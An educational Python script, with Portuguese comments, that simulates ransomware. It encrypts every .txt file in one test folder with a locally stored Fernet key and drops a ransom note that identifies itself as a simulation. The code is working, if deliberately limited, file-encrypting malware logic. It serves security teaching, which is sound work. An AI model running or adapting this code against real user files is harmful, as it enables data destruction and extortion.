"""
=============================================================================
== PROJETO: Simulação de Ransomware Educacional (Santander Cybersecurity)
== AUTOR: Revoluxti
==
== DESCRIÇÃO:
== Este script simula um ataque de ransomware para fins educacionais.
==
== FLUXO DO "ATAQUE":
== 1. GERAR CHAVE: Verifica se uma chave de criptografia ('mykey.key')
==    existe. Se não, gera uma nova usando 'cryptography.fernet'.
== 2. VARREDURA: Procura por arquivos com uma extensão específica
==    (ex: .txt) em um diretório-alvo ('arquivosDesafios').
== 3. CRIPTOGRAFIA: Lê o conteúdo de cada arquivo-alvo,
==    criptografa-o usando a chave Fernet e reescreve o arquivo
==    com o conteúdo criptografado.
== 4. NOTA DE RESGATE: Cria um arquivo 'LEIA_ME_RESGATE.txt' no
==    diretório-alvo explicando a (simulação) do ataque.
==
== NOTA EDUCACIONAL (LIMITAÇÕES DA SIMULAÇÃO):
== - Este script usa criptografia SIMÉTRICA (Fernet), onde a mesma
==   chave criptografa e descriptografa.
== - A chave é salva localmente ('mykey.key').
== - Um ransomware real usaria criptografia ASSIMÉTRICA (ex: RSA).
==   Ele criptografaria os arquivos com uma Chave Pública (embutida
==   no script) e a Chave Privada (necessária para descriptografar)
==   ficaria *apenas* com o invasor, tornando a recuperação impossível
==   sem ela.
=============================================================================
"""

import os
from cryptography.fernet import Fernet # Biblioteca de criptografia

# --- [BLOCO 1: CONFIGURAÇÕES E VARIÁVEIS GLOBAIS] ---

# Nome do arquivo que armazenará a chave de criptografia/descriptografia
KEY_FILE = "mykey.key"
# Diretório-alvo do ataque. SÓ VAMOS MEXER AQUI PARA SEGURANÇA.
TARGET_DIRECTORY = "arquivosDesafios"
# Para segurança, vamos criptografar apenas arquivos .txt de teste
TARGET_EXTENSION = ".txt"
# Nome do arquivo da nota de resgate
RANSOM_NOTE_FILE = "LEIA_ME_RESGATE.txt"

# --- [BLOCO 2: FUNÇÕES DE GERENCIAMENTO DA CHAVE] ---

def generate_key():
    """
    Gera uma chave Fernet e a salva em um arquivo.
    """
    print(f"[LOG]: Gerando nova chave de criptografia...")
    key = Fernet.generate_key()
    # 'wb' = Write Bytes (escrever em modo binário)
    with open(KEY_FILE, "wb") as key_file:
        key_file.write(key)
    print(f"[LOG]: Chave salva em '{KEY_FILE}'. (Esta é a chave 'mestra')")
    return key

def load_key():
    """
    Carrega a chave do arquivo 'mykey.key'.
    Se o arquivo não existir, chama generate_key() para criar uma.
    """
    if not os.path.exists(KEY_FILE):
        key = generate_key()
    else:
        print(f"[LOG]: Carregando chave existente de '{KEY_FILE}'...")
        # 'rb' = Read Bytes (ler em modo binário)
        with open(KEY_FILE, "rb") as key_file:
            key = key_file.read()
    
    return key

# --- [BLOCO 3: FUNÇÕES DE "ATAQUE" (CRIPTOGRAFIA)] ---

def encrypt_file(file_path, fernet_obj):
    """
    Criptografa um único arquivo usando o objeto Fernet (que contém a chave).
    """
    try:
        # Lê o conteúdo original do arquivo
        with open(file_path, "rb") as file:
            original_data = file.read()
        
        # Criptografa o conteúdo
        encrypted_data = fernet_obj.encrypt(original_data)
        
        # Reescreve o arquivo com o conteúdo criptografado
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        
        print(f"[ENCRYPTED]: {file_path}")

    except Exception as e:
        print(f"[ERROR]: Falha ao criptografar {file_path}: {e}")

def create_ransom_note():
    """
    Cria a nota de resgate no diretório-alvo.
    """
    note_path = os.path.join(TARGET_DIRECTORY, RANSOM_NOTE_FILE)
    ransom_note_content = f"""
    !!! ATENÇÃO: SEUS ARQUIVOS FORAM CRIPTOGRAFADOS !!!
    (Isto é uma simulação educacional - Projeto Santander Cybersecurity)
    
    Todos os seus arquivos importantes ({TARGET_EXTENSION}) na pasta '{TARGET_DIRECTORY}'
    foram bloqueados usando criptografia forte.
    
    Para recuperá-los, você precisaria da chave 'mykey.key' e do script 'decrypt.py'.
    Em um ataque real, o invasor exigiria um pagamento.
    
    NUNCA PAGUE O RESGATE. A melhor defesa é ter BACKUPS.
    - Revoluxti Red Team (Simulação)
    """
    # 'w' = Write (modo de escrita de texto)
    with open(note_path, "w", encoding="utf-8") as note:
        note.write(ransom_note_content)
    print(f"[LOG]: Nota de resgate criada em '{note_path}'")

# --- [BLOCO 4: EXECUÇÃO PRINCIPAL] ---

if __name__ == "__main__":
    print("--- Iniciando Simulação de Ransomware (Fins Educacionais) ---")

    # Garante que o diretório-alvo exista
    if not os.path.exists(TARGET_DIRECTORY):
        print(f"[ERROR]: O diretório-alvo '{TARGET_DIRECTORY}' não foi encontrado.")
    else:
        # 1. Carrega (ou gera) a chave
        key = load_key()
        # 2. Cria o objeto de criptografia Fernet com a chave
        f = Fernet(key)
        
        print(f"\n[TARGET]: Procurando por arquivos '{TARGET_EXTENSION}' em '{TARGET_DIRECTORY}'...")
        
        file_count = 0
        # 3. Itera por todos os arquivos no diretório-alvo
        for filename in os.listdir(TARGET_DIRECTORY):
            # 4. Verifica se o arquivo tem a extensão que queremos atacar
            if filename.endswith(TARGET_EXTENSION):
                file_path = os.path.join(TARGET_DIRECTORY, filename)
                # 5. Chama a função de criptografia
                encrypt_file(file_path, f)
                file_count += 1
        
        if file_count > 0:
            print(f"\n[SUCCESS]: {file_count} arquivo(s) foram criptografados.")
            # 6. Cria a nota de resgate no final
            create_ransom_note()
        else:
            print(f"\n[LOG]: Nenhum arquivo '{TARGET_EXTENSION}' encontrado para criptografar.")

    print("\n--- Simulação Concluída ---")